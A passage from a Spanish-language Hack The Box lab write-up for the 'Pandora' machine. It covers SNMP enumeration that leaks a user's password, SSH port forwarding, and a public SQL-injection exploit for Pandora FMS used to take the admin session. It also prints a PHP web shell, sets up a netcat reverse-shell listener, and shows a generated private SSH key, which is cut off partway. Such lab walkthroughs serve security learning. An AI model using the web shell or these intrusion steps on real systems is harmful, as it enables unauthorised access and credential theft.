|   343:
|     Name: kdmflush
|   345:
|     Name: kdmflush
|   376:
|     Name: raid5wq
|   430:
|     Name: kworker/0:1H-kblockd
|   434:
|     Name: jbd2/dm-0-8
|   435:
|     Name: ext4-rsv-conver
|   489:
|     Name: systemd-journal
|   516:
|     Name: systemd-udevd
|   518:
|     Name: systemd-network
|   660:
|     Name: kaluad
|   661:
|     Name: kmpath_rdacd
|   662:
|     Name: kmpathd
|   663:
|     Name: kmpath_handlerd
|   664:
|     Name: multipathd
|   672:
|     Name: jbd2/sda2-8
|   673:
|     Name: ext4-rsv-conver
|   685:
|     Name: systemd-resolve
|   688:
|     Name: systemd-timesyn
|   704:
|     Name: VGAuthService
|   712:
|     Name: vmtoolsd
|   758:
|     Name: accounts-daemon
|   759:
|     Name: dbus-daemon
|   764:
|     Name: irqbalance
|   765:
|     Name: networkd-dispat
|   766:
|     Name: rsyslogd
|   767:
|     Name: systemd-logind
|   772:
|     Name: udisksd
|   790:
|     Name: cron
|   807:
|     Name: cron
|   829:
|     Name: atd
|   840:
|     Name: sh
|   845:
|     Name: snmpd
|   850:
|     Name: sshd
|   878:
|     Name: agetty
|   879:
|     Name: kworker/0:6-rcu_gp
|   928:
|     Name: apache2
|   960:
|     Name: mysqld
|   967:
|     Name: polkitd
|   1102:
|     Name: host_check
|   2831:
|     Name: apache2
|   3138:
|     Name: kworker/1:0-events
|   3287:
|     Name: kworker/u4:0-events_power_efficient
|   3429:
|     Name: apache2
|   3432:
|     Name: apache2
|   3479:
|     Name: apache2
|   3514:
|     Name: apache2
|   3524:
|     Name: apache2
|   3552:
|     Name: apache2
|   3579:
|     Name: apache2
|   5024:
|     Name: apache2
|   5066:
|_    Name: apache2
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 27m06s
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:60648   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          <span class="k">*</span>:<span class="k">*</span>
|_  UDP  127.0.0.53:53        <span class="k">*</span>:<span class="k">*</span>
Service Info: Host: pandora
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos a enumerar este servicio <a href="https://www.paessler.com/es/it-explained/snmp">https://www.paessler.com/es/it-explained/snmp</a> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</a>.</p>
  </li>
  <li>
    <p>Vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">snmpwalk</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp</a>.</p>
  </li>
  <li>
    <p>Para enumerar necesitamos saber una <code class="language-plaintext highlighter-rouge">community string</code> valida la mas conocida es <code class="language-plaintext highlighter-rouge">Public</code> podemos probar enumerando con ese nombre.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap snmpwalk <span class="nt">-v2c</span> <span class="nt">-c</span> public 10.10.11.136
iso.3.6.1.2.1.1.1.0 <span class="o">=</span> STRING: <span class="s2">"Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"</span>
iso.3.6.1.2.1.1.2.0 <span class="o">=</span> OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 <span class="o">=</span> Timeticks: <span class="o">(</span>209683<span class="o">)</span> 0:34:56.83
iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"Daniel"</span>
iso.3.6.1.2.1.1.5.0 <span class="o">=</span> STRING: <span class="s2">"pandora"</span>
iso.3.6.1.2.1.1.6.0 <span class="o">=</span> STRING: <span class="s2">"Mississippi"</span>
iso.3.6.1.2.1.1.7.0 <span class="o">=</span> INTEGER: 72
iso.3.6.1.2.1.1.8.0 <span class="o">=</span> Timeticks: <span class="o">(</span>10<span class="o">)</span> 0:00:00.10
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos el nombre de un usuario el cual es Daniel.</p>
  </li>
  <li>
    <p>Existe otra herramienta la cual funciona mucho mejor se llama <code class="language-plaintext highlighter-rouge">snmpbulkwalk</code>.</p>
  </li>
  <li>
    <p>Podemos hacer lo mismo pero exportaremos todo a un <code class="language-plaintext highlighter-rouge">.txt</code> para simplemente <code class="language-plaintext highlighter-rouge">grepear</code> por Daniel para ver si vemos mas informaci√≥n.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content snmpbulkwalk <span class="nt">-c</span> public <span class="nt">-v2c</span> 10.10.11.136 <span class="o">&gt;</span> snmp_enum.txt
‚ûú  content <span class="nb">wc</span> <span class="nt">-l</span> snmp_enum.txt
6989 snmp_enum.txt
</code></pre></div></div>

<ul>
  <li>Vemos la contrase√±a del usuario Daniel.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">cat </span>snmp_enum.txt | <span class="nb">grep</span> <span class="s2">"Daniel"</span> <span class="nt">-i</span>
iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"Daniel"</span>
iso.3.6.1.2.1.25.4.2.1.5.840 <span class="o">=</span> STRING: <span class="s2">"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"</span>
iso.3.6.1.2.1.25.4.2.1.5.1102 <span class="o">=</span> STRING: <span class="s2">"-u daniel -p HotelBabylon23"</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Daniel:HotelBabylon23</code>.</li>
</ul>

<h2 id="shell-as-daniel">Shell as daniel</h2>

<ul>
  <li>Como el puerto 22 que corresponde a SSH esta abierto podemos conectarnos con las credenciales que encontramos enumerando por ese protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content ssh daniel@10.10.11.136
The authenticity of host <span class="s1">'10.10.11.136 (10.10.11.136)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.136<span class="s1">' (ED25519) to the list of known hosts.
daniel@10.10.11.136'</span>s password:
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed 19 Jun 19:35:55 UTC 2024

  System load:           0.0
  Usage of /:            63.5% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             229
  Users logged <span class="k">in</span>:       0
  IPv4 address <span class="k">for </span>eth0: 10.10.11.136
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb0:def7

  <span class="o">=&gt;</span> /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update


The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>No tenemos ning√∫n privilegio a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>daniel:
Sorry, user daniel may not run <span class="nb">sudo </span>on pandora.
</code></pre></div></div>

<ul>
  <li>Hay otro usuario el cual se llama <code class="language-plaintext highlighter-rouge">matt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:~<span class="nv">$ </span><span class="nb">cd</span> /home/
daniel@pandora:/home<span class="nv">$ </span><span class="nb">ls
</span>daniel  matt
daniel@pandora:/home<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>sh
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
daniel@pandora:/home<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Necesitamos convertirnos en ese usuario para poder leer la <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/home/matt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
<span class="nt">-rw-r-----</span> 1 root matt 33 Jun 19 18:56 user.txt
daniel@pandora:/home/matt<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat</span>: user.txt: Permission denied
</code></pre></div></div>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">pandora_backup</code> adem√°s de tener el <code class="language-plaintext highlighter-rouge">pkexec</code> expuesto en esta ocasi√≥n no lo vamos a explotar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/pandora_backup
./usr/bin/passwd
./usr/bin/mount
./usr/bin/su
./usr/bin/at
./usr/bin/fusermount
./usr/bin/chsh
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
</code></pre></div></div>

<ul>
  <li>El grupo asignado es matt y el propietario es root.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> ./usr/bin/pandora_backup
<span class="nt">-rwsr-x---</span> 1 root matt 16816 Dec  3  2021 ./usr/bin/pandora_backup
</code></pre></div></div>

<ul>
  <li>Tenemos que convertirnos en <code class="language-plaintext highlighter-rouge">matt</code> as√≠ que vamos ir a la ruta donde esta montana la pagina web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 8
drwxr-xr-x 3 root root 4096 Dec  7  2021 html
drwxr-xr-x 3 matt matt 4096 Dec  7  2021 pandora
daniel@pandora:/var/www<span class="nv">$ </span><span class="nb">cd </span>pandora/
daniel@pandora:/var/www/pandora<span class="nv">$ </span>ll
total 16
drwxr-xr-x  3 matt matt 4096 Dec  7  2021 ./
drwxr-xr-x  4 root root 4096 Dec  7  2021 ../
<span class="nt">-rw-r--r--</span>  1 matt matt   63 Jun 11  2021 index.html
drwxr-xr-x 16 matt matt 4096 Dec  7  2021 pandora_console/
</code></pre></div></div>

<ul>
  <li>Vemos los archivos de configuraci√≥n de Pandora <a href="https://pandorafms.com/es/">https://pandorafms.com/es/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/var/www/pandora<span class="nv">$ </span><span class="nb">cd </span>pandora_console/
daniel@pandora:/var/www/pandora/pandora_console<span class="nv">$ </span><span class="nb">ls
</span>ajax.php       COPYING               extras   index.php                         pandora_console_logrotate_suse    tests
attachment     DB_Dockerfile         fonts    install.done                      pandora_console_logrotate_ubuntu  tools
audit.log      DEBIAN                general  mobile                            pandora_console_upgrade           vendor
AUTHORS        docker_entrypoint.sh  godmode  operation                         pandoradb_data.sql                ws.php
composer.json  Dockerfile            images   pandora_console.log               pandoradb.sql
composer.lock  extensions            include  pandora_console_logrotate_centos  pandora_websocket_engine.service
</code></pre></div></div>

<ul>
  <li>La web esta usando Apache2 al ir a su ruta hay un archivo el cual se llama <code class="language-plaintext highlighter-rouge">pandora.conf</code> que contiene un subdominio y lo esta corriendo el usuario <code class="language-plaintext highlighter-rouge">matt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/etc/apache2/sites-enabled<span class="nv">$ </span><span class="nb">cat </span>pandora.conf
&lt;VirtualHost localhost:80&gt;
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  &lt;Directory /var/www/pandora&gt;
    AllowOverride All
  &lt;/Directory&gt;
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
&lt;/VirtualHost&gt;
</code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para ver si vemos algo diferente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ <span class="nb">echo</span> <span class="s2">"10.10.11.136 pandora.panda.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.136 pandora.panda.htb
</code></pre></div></div>

<ul>
  <li>Vemos lo mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/2.png" />
</p>

<ul>
  <li>Pero nos dice que se esta corriendo en el puerto 80 puede que externamente no lo veamos expuesto pero con esto podemos comprobar que si se esta corriendo y nos lleva ala ruta <code class="language-plaintext highlighter-rouge">/pandora_console</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/etc/apache2/sites-enabled<span class="nv">$ </span>curl localhost
&lt;meta HTTP-EQUIV<span class="o">=</span><span class="s2">"REFRESH"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0; url=/pandora_console/"</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="local-port-forwarding">Local Port Forwarding</h2>

<ul>
  <li>Vamos a hacer un <code class="language-plaintext highlighter-rouge">Local Port Forwarding</code> para que el puerto <code class="language-plaintext highlighter-rouge">80</code> de la m√°quina sea nuestro puerto <code class="language-plaintext highlighter-rouge">80</code> y ver lo que esta corriendo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content ssh daniel@10.10.11.136 <span class="nt">-L</span> 80:127.0.0.1:80
daniel@10.10.11.136<span class="s1">'s password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 19 Jun 19:52:31 UTC 2024

  System load:           0.06
  Usage of /:            63.5% of 4.87GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb0:def7

  =&gt; /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun 19 19:35:56 2024 from 10.10.14.62
daniel@pandora:~$
</span></code></pre></div></div>

<ul>
  <li>Comprobamos que todo este bien.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content lsof <span class="nt">-i</span>:80
COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     19827 miguel    4u  IPv6  64194      0t0  TCP localhost:http <span class="o">(</span>LISTEN<span class="o">)</span>
ssh     19827 miguel    5u  IPv4  64195      0t0  TCP localhost:http <span class="o">(</span>LISTEN<span class="o">)</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/3.png" />
</p>

<ul>
  <li>Abajo de la web tenemos la versi√≥n que esta corriendo pandora.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/4.png" />
</p>

<h2 id="cve-2021-32099-unauthenticated-sql-injection">CVE-2021-32099 Unauthenticated SQL Injection</h2>

<ul>
  <li>
    <p>Como no tenemos credenciales encontramos que esta versi√≥n es vulnerable <a href="https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/">https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/</a>.</p>
  </li>
  <li>
    <p>Esta es la ruta que nos dicen donde se aplica la SQL Injection.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/5.png" />
</p>

<ul>
  <li>Podemos ocasionar un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/6.png" />
</p>

<ul>
  <li>Al parecer existen demasiadas vulnerabilidades.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content searchsploit pandora
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                        |  Path
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Pandora 7.0NG - Remote Code Execution | php/webapps/47898.py
Pandora FMS - Ping Authenticated Remo | linux/remote/48334.rb
Pandora Fms - Remote Code Execution <span class="o">(</span> | linux/remote/31518.rb
Pandora Fms - SQL Injection Remote Co | php/remote/35380.rb
Pandora FMS 3.1 - Authentication Bypa | php/remote/35731.rb
Pandora FMS 3.1 - Authentication Bypa | php/webapps/15639.txt
Pandora Fms 3.1 - Blind SQL Injection | php/webapps/15642.txt
Pandora Fms 3.1 - Directory Traversal | php/webapps/15643.txt
Pandora Fms 3.1 - OS Command Injectio | php/webapps/15640.txt
Pandora Fms 3.1 - SQL Injection       | php/webapps/15641.txt
Pandora Fms 3.2.1 - Cross-Site Reques | php/webapps/17524.html
Pandora FMS 3.x - <span class="s1">'index.php'</span> Cross-S | php/webapps/36073.txt
Pandora FMS 4.0.1 - <span class="s1">'sec2'</span> Local File | php/webapps/36792.txt
Pandora Fms 4.0.1 - Local File Inclus | php/webapps/18494.txt
Pandora FMS 5.0/5.1 - Authentication  | php/webapps/37255.txt
Pandora Fms 5.0RC1 - Remote Command I | php/webapps/31436.txt
Pandora FMS 5.1 SP1 - SQL Injection   | php/webapps/36055.txt
Pandora FMS 7.0 NG 749 - <span class="s1">'CG Items'</span> S | php/webapps/49046.txt
Pandora FMS 7.0 NG 749 - Multiple Per | php/webapps/49139.txt
Pandora FMS 7.0 NG 750 - <span class="s1">'Network Sca | php/webapps/49312.txt
Pandora FMS 7.0NG - '</span>net_tools.php<span class="s1">' R | php/webapps/48280.py
Pandora FMS Monitoring Application 2. | php/webapps/10570.txt
Pandora FMS v7.0NG.742 - Remote Code  | php/webapps/50961.py
PANDORAFMS 7.0 - Authenticated Remote | php/webapps/48064.py
PandoraFMS 7.0 NG 746 - Persistent Cr | php/webapps/48707.txt
PandoraFMS NG747 7.0 - '</span>filename<span class="s1">' Per | php/webapps/48700.txt
-------------------------------------- ---------------------------------
Shellcodes: No Results
</span></code></pre></div></div>

<ul>
  <li>Buscando en GitHub encontramos este <code class="language-plaintext highlighter-rouge">exploit</code> en Python <a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated">https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
<span class="nt">--2024-06-19</span> 14:07:56--  https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6230 <span class="o">(</span>6.1K<span class="o">)</span> <span class="o">[</span>text/plain]
Saving to: ‚Äòsqlpwn.py‚Äô

sqlpwn.py                            100%[<span class="o">=====================================================================&gt;]</span>   6.08K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-06-19 14:07:56 <span class="o">(</span>43.8 MB/s<span class="o">)</span> - ‚Äòsqlpwn.py‚Äô saved <span class="o">[</span>6230/6230]
</code></pre></div></div>

<ul>
  <li>Si analizamos el <code class="language-plaintext highlighter-rouge">exploit</code> vemos que esta subiendo una <code class="language-plaintext highlighter-rouge">webshell</code> a una ruta lo cual esto ya es interesante ya que con esto sabemos que se pueden subir archivos pero supongo que eso es cuando ya estas dentro del panel de este servicio.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/7.png" />
</p>

<ul>
  <li>Adem√°s las primeras l√≠neas del <code class="language-plaintext highlighter-rouge">script</code> vemos que se esta empleando una cookie del usuario administrador la cual aun no tenemos vamos a copiarnos la inyecci√≥n para ver que es lo que hace.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/8.png" />
</p>

<ul>
  <li>No vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/9.png" />
</p>

<ul>
  <li>Pero bueno hay que recordar que con esta <code class="language-plaintext highlighter-rouge">query</code> le estamos robando la cookie al usuario administrador as√≠ que si esto funciono solo quitamos toda la <code class="language-plaintext highlighter-rouge">query</code> que metimos y listo estamos logueados.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/10.png" />
</p>

<h2 id="shell-as-matt">Shell as matt</h2>

<ul>
  <li>Aqu√≠ vemos una parte donde dice File Manager.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/11.png" />
</p>

<ul>
  <li>Creamos un nuevo directorio.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/12.png" />
</p>

<ul>
  <li>Vemos que esta en la ruta <code class="language-plaintext highlighter-rouge">images</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/13.png" />
</p>

<ul>
  <li>Vamos a subir un <code class="language-plaintext highlighter-rouge">cmd.php</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
	<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/14.png" />
</p>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/15.png" />
</p>

<ul>
  <li>Vamos a ponernos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/16.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.136] 39764
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>928<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span><span class="nb">whoami
whoami
</span>matt
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="err">$</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
&lt;pandora_console/images/xd<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 28851 suspended  nc <span class="nt">-nlvp</span> 443
‚ûú  content <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 28851 continued  nc <span class="nt">-nlvp</span> 443
                                    reset xterm
&lt;ENTER&gt;
matt@pandora:/var/www/pandora/pandora_console/images/xd<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/home/matt<span class="nv">$ </span><span class="nb">cat </span>user.txt
3fb235f22fcbdf0957956bf99e229431
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Podemos conectarnos por SSH cre√°ndonos la clave id_rsa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/home/matt<span class="nv">$ </span><span class="nb">mkdir</span> .ssh
matt@pandora:/home/matt<span class="nv">$ </span>ssh-keygen
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/matt/.ssh/id_rsa<span class="o">)</span>:
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved <span class="k">in</span> /home/matt/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:+4zYpQAjpjQhKRgfIQu5wj4JAjOycPSQ+hwVeIqBMBU matt@pandora
The key<span class="s1">'s randomart image is:
+---[RSA 3072]----+
|O+E=..           |
|%B++o            |
|@@.+.            |
|@.+              |
|==+.o   S        |
|.*+. o   .       |
|. .   . . .      |
|       + *       |
|      . + o      |
+----[SHA256]-----+
matt@pandora:/home/matt$ cd .ssh/
matt@pandora:/home/matt/.ssh$ ls
id_rsa  id_rsa.pub
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub &gt; authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>matt@pandora:/home/matt/.ssh<span class="nv">$ </span><span class="nb">cat </span>id_rsa
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAoPOuIm3w9hG+Cpj/5xA4L9ln/sFn78xiHzlx+ml/uh7zLEmL7d0o
IMkIEWPIgbThYQF6ggwfHc1w2R/Et2jtyaEgZVfwkVILQgP7prZ34vHD43xpjGKUK/zkPf
q1ICeyI922GXIbyeIFqKHrbUGsmiSVkLquGonK0sFYPgRsNIEb8u4GH7NiPly1eQ14JDYj
XXY3uQ0K/xXIRdT/Y71YvtXIER9Gc9D5wESP4h+UAdG1SgCJEJmQA8suwJ9geWLRDPqikP
E9cvMqQLHAByy/eR/RumMAdfq0TJ72lAUpVdnZ33epn8pRNFPkXB73aje+CH2y8yqZQ3DY
T2jl0Z7wCSLlSjJl2VIC/b9hykNyZcjF3jQJerNQHYL5Ryz19ndU+oWRUBETrvzwjVD69h
QUNu9Qi/xLr7FvBZLsLu6znL5nnZt72MWZI1u3bCPA02YWwEps9RFv1ZUTNDzHlGKqXA8h
Mjxms8QsedURBlYDoPejrfXv1FDhTg47h9kn1dvvAAAFiO7SFu3u0hbtAAAAB3NzaC1yc2
EAAAGBAKDzriJt8PYRvgqY/+cQOC/ZZ/7BZ+/MYh85cfppf7oe8yxJi+3dKCDJCBFjyIG0
4WEBeoIMHx3NcNkfxLdo7cmhIGVX8JFSC0ID+6a2d+Lxw+N8aYxilCv85D36tSAnsiPdth
lyG8niBaih621BrJoklZC6rhqJytLBWD4EbDSBG/LuBh+zYj5ctXkNeCQ2I112N7kNCv8V
yEXU/2O9WL7VyBEfRnPQ+cBEj+IflAHRtUoAiRCZkAPLLsCfYHli0Qz6opDxPXLzKkCxwA
csv3kf0bpjAHX6tEye9pQFKVXZ2d93qZ/KUTRT5Fwe92o3vgh9svMqmUNw2E9o5dGe8Aki
